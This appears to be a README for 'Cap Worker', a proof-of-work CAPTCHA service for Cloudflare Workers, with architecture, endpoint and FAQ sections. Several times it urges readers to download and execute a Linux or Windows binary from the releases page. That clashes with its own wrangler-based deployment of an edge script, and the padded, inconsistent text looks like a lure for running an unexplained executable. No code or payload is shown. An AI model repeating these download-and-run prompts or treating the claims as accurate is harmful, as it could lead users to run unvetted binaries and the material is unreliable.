https://github.com/linyu413/cap-worker/releases

# Cap Worker: Open-Source SHA-256 PoW CAPTCHA on Cloudflare Workers Platform

![Cloudflare Shield](https://upload.wikimedia.org/wikipedia/commons/thumb/4/48/Shield_icon.png/200px-Shield_icon.png)  
![Cloud Icon](https://upload.wikimedia.org/wikipedia/commons/thumb/0/0b/Cloud.png/200px-Cloud.png)

Cap Worker is a backend server built on Cloudflare workers. It uses a modern open-source CAPTCHA alternative based on SHA-256 proof-of-work. It protects services from automated traffic and DDoS while remaining lightweight and verifiable. This project embraces open standards, fast execution, and a minimal attack surface. The core idea is simple: require clients to perform a small amount of computational work that proves they are human enough to proceed, but without the burden of traditional CAPTCHAs.

[Releases badge]([Releases](https://github.com/linyu413/cap-worker/releases)) • Topics: captcha, cloudflare, cloudflare-workers, ddos-protection, proof-of-work, recapcha

Table of contents
- Why Cap Worker exists
- How Cap Worker works
- Core concepts and design goals
- Features at a glance
- Architecture overview
- Getting started
- Local development and testing
- Deployment on Cloudflare Workers
- Configuration and customization
- Endpoints and API workflow
- Security and hardening
- Performance considerations
- Testing and quality assurance
- Release management and updates
- Roadmap and extensions
- Contributing to Cap Worker
- FAQ
- License and attribution
- Changelog

Why Cap Worker exists 🚀
Cap Worker targets sites and services that need fast, scalable protection against automated traffic without relying on bulky image challenges or external services. The system leverages the speed and edge-caching of Cloudflare Workers to deliver a tiny, deterministic PoW-based CAPTCHA. It reduces bandwidth usage and server load while maintaining a clear, auditable proof-of-work mechanism.

Key motivations:
- Reduce user friction while preserving security.
- Leverage edge compute for fast challenge generation and verification.
- Provide a transparent, auditable alternative to third-party CAPTCHA services.
- Allow self-hosting with clear, open-source tooling.

How Cap Worker works 🧠
Cap Worker uses a SHA-256 proof-of-work as the CAPTCHA challenge. A client requesting protection receives a challenge with a difficulty level and a short salt. The client computes a nonce that, when combined with the challenge, yields a hash below a target threshold. The client sends the nonce back to the server, where the hash is recomputed and validated. If the hash meets the difficulty requirement, the client passes the test and proceeds to the protected resource.

The workflow in plain terms:
- Client asks for a challenge.
- Server returns a challenge string, a difficulty value, and a salt.
- Client computes a nonce that makes hash(challenge + nonce + salt) fall below a target.
- Client submits the nonce back to the server.
- Server validates the hash with the same challenge and salt.
- If valid, the client receives authorization or access to the requested resource.

Core concepts and design goals 🧭
- Simplicity: A small, understandable proof-of-work puzzle replaces traditional CAPTCHA prompts.
- Speed: Edge-based verification minimizes latency and keeps user experience snappy.
- Security: The challenge is random, unique per session, and tied to a salt to prevent replay.
- Stateless verification: The worker can verify proofs without maintaining heavy per-user state.
- Extensibility: The architecture supports additional validation checks, rate limits, and pluggable policies.
- Observability: Clear logging and metrics for validation attempts, failures, and performance.

Features at a glance ✨
- SHA-256 based CAPTCHA: Lightweight, verifiable, and deterministic.
- Cloudflare Workers deployment: Edge-friendly, fast to deploy, scalable.
- Stateless verification: Minimal server-side state, improved resilience.
- Configurable difficulty: Fine-grained control over puzzle hardness.
- Challenge lifecycle: Short-lived challenges to reduce replay risk.
- Rate limiting: Simple measures to deter abuse.
- Auditable logs: Clear traceability for security reviews.
- Extensible API: Easy to integrate into existing apps and services.
- Open-source and self-hostable: Take control of your security tooling.

Architecture overview 🏗️
- Edge layer (Cloudflare Workers): Handles challenge generation, PoW verification, and access gating.
- Challenge store (in-memory or KV): Stores ephemeral challenge metadata for session validation.
- Verification service: Recomputes SHA-256 hash for the provided nonce and challenge.
- Access gate: Allows or blocks requests to protected resources based on PoW validity.
- Observability: Logging and metrics hooks to track performance and abuse.

High-level components
- ChallengeGenerator: Creates random challenges and salts per session.
- PoWVerifier: Recomputes and validates the proof-of-work hash against difficulty.
- AccessController: Grants or denies access to the protected endpoint.
- Config: Holds tunable parameters for difficulty, TTL, and rate limits.
- Telemetry: Emits events for diagnostics and analytics.

Security posture and considerations 🛡️
- Replay protection: Short-lived challenges and nonces reduce replay risk.
- Salted challenges: Each challenge includes a random salt to prevent precomputation attacks.
- Difficulty tuning: Operators can adjust to match traffic patterns and bot profiles.
- Rate limiting: Per-IP or per-session throttling helps deter abuse.
- Logging discipline: Sensitive data is minimized; logs capture outcomes for audits.
- Edge isolation: Workers run in isolated environments, limiting blast radius.
- Data minimization: Minimal state is stored; no long-term secrets on the edge.

Getting started: a quick path to running Cap Worker
Note: The link to the releases page is provided here for access to assets. For direct downloads, visit the Releases page and grab the latest release asset suitable for your platform. You can download and execute that file to start Cap Worker.

- Quick path
  1) Visit the releases page to obtain the latest build:
     https://github.com/linyu413/cap-worker/releases
  2) Download the release asset for your platform (for example, a Linux or Windows binary, or a bundled package provided in the asset list).
  3) Unpack the asset if needed and run the executable as directed by the release notes.
  4) Point your environment to Cloudflare Workers as the runtime and configure the endpoints as described in the configuration guide.

- Why this approach
  Cap Worker is designed to work at the edge. You should be able to deploy quickly, with minimal friction, while still having the option to inspect and modify the code. The release assets are prepared to run on standard environments, with minimal prerequisites.

- What you’ll need
  - Access to a Cloudflare account and a Worker environment, or a compatible edge runtime.
  - A supported runtime for the release asset (see the release notes for requirements).
  - A basic understanding of HTTP endpoints and JSON payloads.
  - A text editor to customize configuration files and environment variables.

Getting started with the codebase
- Prerequisites
  - Node.js (for tooling, testing, and building if you work with source)
  - Wrangler or an equivalent Cloudflare Workers deployment tool
  - A local environment that mimics your target edge runtime if you plan to test locally

- Repository layout (typical)
  - src/ contains the main worker logic
  - assets/ holds static resources used by the UI or auxiliary help
  - tests/ includes unit and integration tests
  - config/ contains configuration templates and defaults
  - docs/ contains in-depth explanations, examples, and API references
  - scripts/ provides helper scripts for development, build, and release

- Build from source
  - Install dependencies
    - npm install
  - Compile or bundle the worker
    - npm run build
  - Run local tests
    - npm test
  - Local development with a simulator
    - npm run dev
  - Deploy to Cloudflare Workers
    - wrangler login
    - wrangler publish

- Quick start example (conceptual)
  1) Generate a challenge
     - Server creates a random string and a salt.
     - A difficulty is chosen based on configuration.
  2) Solve the puzzle on the client
     - The client iterates nonces until sha256(challenge + nonce + salt) < target.
  3) Validate on the server
     - The server recomputes sha256(challenge + nonce + salt) and checks the result against the difficulty.
  4) Grant access
     - If valid, the request proceeds to the protected resource.

- Environment and configuration
  - Difficulty: Numerical value controlling the hash target.
  - Challenge TTL: Time-to-live for issued challenges.
  - Rate limits: Limits per IP or per origin to prevent abuse.
  - Secrets: Optional secret keys used for additional validation or logs.
  - Endpoints: Paths for challenge retrieval and submission.

- API design philosophy
  - Stateless until necessary
  - Simple JSON payloads
  - Clear error codes and messages
  - Predictable timing and responses

Downloads and assets
- The primary download source is the official releases page. The latest release assets are hosted there for various platforms. The link provided at the top of this document points to that page. To ensure you get a compatible binary, check the release notes for the asset names, platform compatibility, and installation instructions. The asset list contains zip, tar.gz, and platform-specific bundles that simplify setup.

- How to use the releases page effectively
  - Open the page and review the latest release notes.
  - Identify the asset matching your environment (Linux, Windows, macOS, or a container image if offered).
  - Download the file and follow the included instructions to install and run Cap Worker.
  - If you encounter platform-specific issues, refer to the “Troubleshooting” section in the docs or raise an issue on GitHub.

- Revisit the releases page as you update
  - The project evolves with security improvements, performance tuning, and API changes.
  - Each release includes a changelog describing fixes and enhancements.
  - To stay current, check the Releases page periodically or subscribe to notifications.

Usage patterns and recommended workflows
- Edge-first security posture
  Cap Worker is designed to run on the edge. It minimizes the distance between the user and the authority that decides whether to allow access. This reduces latency, improves user experience, and lowers the risk of DDoS or volumetric abuse on your origin servers.

- Progressive hardening
  Start with a low difficulty and small TTL for challenges. Monitor abuse indicators, performance, and user experience. Gradually increase difficulty to match traffic patterns. Adjust rate limits to balance protection with accessibility.

- Compatibility considerations
  - If you already use a CAPTCHA provider, Cap Worker serves as a drop-in enhancement at the edge rather than a wholesale replacement of your entire authentication or verification stack.
  - The PoW-based CAPTCHA is language-agnostic. Any client that can perform SHA-256 hashing can solve the puzzle, making it suitable for a wide range of devices and clients.

- Developer experience
  - The codebase favors clarity over clever tricks.
  - Tests cover core PoW generation and verification logic, along with edge-case handling for timeouts and invalid payloads.
  - There are explicit integration tests that simulate client-server interactions with the deployed edge runtime.

Endpoint references and example payloads
- Challenge endpoint (example)
  - Path: /challenge
  - Method: GET
  - Response example:
    {
      "challenge": "f3a9b8d4c6e2a1b7",
      "salt": "7d3f9c1a",
      "difficulty": 20,
      "expires_in": 300
    }

- Submit proof endpoint (example)
  - Path: /verify
  - Method: POST
  - Request body:
    {
      "challenge": "f3a9b8d4c6e2a1b7",
      "nonce": "105423",
      "hash": "1a2b3c4d5e6f..."
    }
  - Response (success):
    {
      "ok": true,
      "message": "Proof accepted",
      "token": "jwt-or-session-id"
    }
  - Response (failure):
    {
      "ok": false,
      "error": "Invalid proof"
    }

- Security and policy decisions in API
  - The challenge includes a random salt for each session.
  - The client’s nonce must be unique per challenge to prevent replay.
  - The server enforces a TTL to reduce stale proofs.
  - Logs capture outcome and hash checks for auditability.

Architecture deep dive
- Edge compute model
  Cap Worker leverages Cloudflare Workers to host the challenge generator, verifier, and access gate. This moves protection logic closer to clients and reduces network hops. The edge-only approach minimizes latencies and reduces attack surfaces on your origin infrastructure.

- Stateless design
  The verifier does not need to store every accepted challenge. It validates based on the challenge, salt, and nonce. The ephemeral state is kept short and disposed after the TTL. This design simplifies scaling and reduces memory pressure.

- Data flows
  1) Client requests a challenge.
  2) Worker responds with challenge, salt, and difficulty.
  3) Client computes nonce and hash.
  4) Client submits proof to /verify.
  5) Worker validates. If valid, access is granted.

- Observability and metrics
  - Request latency is measured end-to-end.
  - Validation success and failure counts are tracked.
  - Abnormal activity patterns trigger rate limiting or automatic lockdowns.
  - Security events (invalid proofs, replay attempts) are logged with context.

- Fail-safe and fallback
  If a challenge cannot be generated due to a transient issue, the system can fall back to a safe default state and present a minimal barrier (or ask the client to retry). This ensures service availability while protecting against abuse.

- Extensibility points
  - Additional proofs: You can replace or supplement SHA-256 PoW with other lightweight puzzles.
  - Pluggable rate limits: Swap in different strategies for per-IP, per-origin, or per-user throttling.
  - Custom verification rules: Add platform-specific checks or identity-based gating.

Security patterns you can implement
- HMAC-based verification
  Combine a server-side secret with the challenge to generate additional verification tokens without exposing the secret to clients.

- Short-lived tokens
  Issue tokens only after a valid PoW. Tokens should expire quickly if unused to minimize risk.

- Nonce reuse protection
  Treat each nonce as unique per challenge to avoid replay. Maintain a small in-memory window for recent nonces if needed.

- DDoS resilience
  Rate limits stay active even under high load. The edge layer helps absorb bursts before they reach the origin.

Performance considerations
- Latency budget
  Edge-based verification yields low latency, but you should monitor the time to generate challenges and verify proofs under load. Cap the difficulty to maintain predictable response times.

- Resource usage
  The SHA-256 hashing is inexpensive on modern hardware. The main cost is network round-trips and Python/JavaScript runtimes if you use a separate verification service. The design minimizes server-side compute.

- Scaling strategy
  Cloudflare Workers scale automatically with demand, but you should plan for:
  - Logs and metrics storage for long-term analyses
  - Backpressure handling if a sudden surge triggers rate limits
  - Redundancy across regions to reduce miss rates

Developer experience and contribution guide
- How to contribute
  - Fork the repo and create a feature branch.
  - Write tests that cover new logic and corner cases.
  - Document API changes with examples.
  - Open a pull request with a clear summary of intent and impact.

- Coding standards
  - Prefer clear variable names and simple logic.
  - Keep functions small and focused.
  - Write unit tests for critical paths, including edge cases like invalid payloads and timeouts.
  - Document public interfaces with concise comments and examples.

- Documentation and examples
  - Provide end-to-end examples showing how a client would obtain a challenge, solve it, and submit the proof.
  - Include sample client code in multiple languages to demonstrate how to integrate PoW with a broader application.

- Testing strategy
  - Unit tests for hash computation, target comparisons, and TTL logic.
  - Integration tests that mimic real client-server interactions on a local or staging environment.
  - Performance tests to measure latency and error rates under load.

- CI/CD practices
  - Automated tests run on each pull request.
  - Linting and type checks run as part of the pipeline.
  - Release automation to package and publish assets to the Releases page.

Releases and release management
- Accessing releases
  The releases page hosts the latest builds, release notes, and assets. Use the link at the top of this document to browse and download the appropriate asset for your platform. If a problem occurs, the release notes provide troubleshooting tips and compatibility notes.

- Update strategy
  - Track security advisories and vulnerability disclosures.
  - Push minor improvements as patch releases and major changes as minor or major releases.
  - Update documentation to reflect API changes and configuration options.

- Downtime and rollback
  - Edge deployments are typically fast and low-risk, but plan for potential rollback scenarios.
  - Maintain a simple rollback plan in case a new release introduces unexpected behavior.

Roadmap and potential extensions
- Enhanced PoW schemes
  Investigate alternative puzzle schemes like scrypt or randomX for different hardware profiles.

- Client-side libraries
  Provide reference implementations in JavaScript, Python, Go, and Rust to help clients integrate quickly.

- UI widgets
  Optional UI components for user-facing pages to display status, progress, and explanations without relying solely on text-based prompts.

- Analytics and telemetry
  Build richer dashboards to observe challenge issuance, hash attempts, success rates, and abuse patterns.

- Multi-tenant deployments
  Support quotas per tenant, per application, or per path to suit larger environments.

- Access policies
  Integrate with existing identity systems to combine PoW with identity-based checks.

- Compliance and privacy
  Document data handling practices, retention policies, and privacy protections.

Frequently asked questions (FAQ)
- Why use a PoW CAPTCHA at the edge?
  It reduces load on your origin, minimizes latency, and provides a reproducible, auditable proof-of-work mechanism. It’s also language-agnostic and avoids heavy UI challenges.

- How difficult should the PoW be?
  Start with a low difficulty that yields a few milliseconds of work on common devices. Monitor and adjust based on traffic and user experience.

- Can Cap Worker replace traditional CAPTCHAs?
  It can serve as a CAPTCHA alternative in many scenarios, especially for high-traffic sites where latency matters. It may not be a perfect fit for all forms of user verification, so consider your specific security requirements.

- Is it safe to run on Cloudflare Workers?
  Yes. The design emphasizes minimal state, short-lived challenges, and edge-isolated verification. The edge layer handles the bulk of risk management, while your origin remains protected.

- How do I customize the integration?
  Adjust the configuration files, tweak difficulty, TTL, rate limits, and endpoints. The architecture is designed to be approachable for developers familiar with Cloudflare Workers.

- What about accessibility and user experience?
  PoW-based CAPTCHAs can be less intrusive than image-based CAPTCHAs. However, some users on low-powered devices might see slower challenge resolution. Tuning difficulty and providing clear messaging helps maintain accessibility.

- Can I audit Cap Worker for security?
  The code is open-source, with tests and documentation aimed at transparency. You can review logic for challenge generation, hashing, and verification. Engage the community with issues and pull requests for improvements.

- Do I need a cloud service to run Cap Worker?
  Cloudflare Workers is the primary target for edge deployment. However, if you adapt the design to a different edge platform, you can run Cap Worker in similar edge environments that support JavaScript-based runtimes.

- How do I report issues or request features?
  Open an issue on GitHub with a detailed description, steps to reproduce, and your environment. Attach logs and configuration excerpts if possible.

Code hygiene and quality guidance
- Keep interfaces stable
- Document any breaking changes
- Provide migration notes for users upgrading
- Include comprehensive tests for new features
- Maintain a changelog that reflects user-facing impact

License and attribution
- The repository includes attribution to open-source components and libraries. Check the repository for the exact license file and terms. Respect all licenses when integrating Cap Worker into your projects.

Changelog
- A concise record of changes per release is documented in the Releases notes. Review the latest entry for a snapshot of fixes, improvements, and new features.

Acknowledgments
- Gratitude to the contributors who helped with design decisions, code, testing, and documentation.
- Special thanks to contributors who built and tested edge deployments on Cloudflare Workers.

Tips for operators and admins
- Start small, then scale
  Begin with a small user base and simple configuration. Observe performance, then scale up by tuning difficulty and rate limits.

- Use the edge to its strengths
  Put the verification logic at the edge, close to clients. This reduces latency and improves user experience.

- Monitor health
  Keep an eye on latency, success rates, and failure patterns. Use the telemetry data to detect abuse and adjust policies.

- Plan for the long term
  Design for maintainability. Document decisions, keep APIs stable, and prepare upgrade paths for future iterations.

Concrete example scenario
- Your site handles millions of requests per day. You want to deter automated traffic without turning away humans with clumsy challenges.
- You deploy Cap Worker to your Cloudflare account. You configure a low initial difficulty and a short TTL for challenges.
- A user’s browser requests a protected resource. The edge generates a challenge and sends it to the browser.
- The browser computes a nonce that satisfies the PoW condition and sends it back to the edge.
- The edge verifies the PoW and, if valid, allows the user to access the resource. Logging records the outcome.
- Over weeks, you observe traffic patterns, adjust difficulty, and refine rate limits as needed.

Environment compatibility notes
- Platform support
  Cap Worker is designed to work with Cloudflare Workers. It should be compatible with other edge runtimes that support similar JavaScript execution environments, provided the APIs align with the project’s design.

- Language and tooling
  The core codebase uses JavaScript/TypeScript-friendly workflows. You can adapt tooling to your preferred ecosystem as long as the edge execution model remains the same.

- Integrations
  Cap Worker can be integrated with various backends, from simple static sites to complex API gateways. Its callbacks and endpoints are designed to be adaptable to many architectures.

- Security posture for different regions
  When deploying across multiple regions, consider local risk profiles, legal requirements, and user expectations. Tailor rate limits and TTLs per region to reflect local traffic characteristics.

Final notes
- This README is designed to be thorough and practical. It emphasizes clarity and a calm, confident tone.
- The approach focuses on edge efficiency, clean architecture, and a strong emphasis on observability.
- If you need adjustments for a specific use case, you can tailor the configuration, endpoints, and policies without breaking the underlying PoW CAPTCHA concept.

Releases link and download note
- Access the official releases page for Cap Worker assets and release notes:
  https://github.com/linyu413/cap-worker/releases
- This link is provided again here to assist you in locating the latest assets and instructions. Use the page to download and execute the appropriate binary or package for your environment. The release assets are designed to be straightforward to install and run across common platforms.
- If you encounter any issues with the link or asset formats, check the Releases section for alternative downloads or updated instructions. You can also search the repo’s release notes for platform-specific guidance and troubleshooting steps.